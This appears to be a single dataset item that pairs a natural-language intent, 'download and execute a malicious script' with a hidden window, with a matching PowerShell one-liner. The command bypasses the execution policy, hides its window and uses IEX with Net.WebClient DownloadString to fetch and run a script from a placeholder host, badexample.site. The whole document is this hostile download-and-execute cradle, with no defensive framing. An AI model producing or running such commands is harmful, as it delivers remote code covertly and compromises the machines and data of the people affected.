# Natural language intent:
# Download and execute a malicious script from a specified website with hidden window style.

powershell.exe -exec bypass -windowstyle hidden -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://badexample.site/badscript.ps1')"
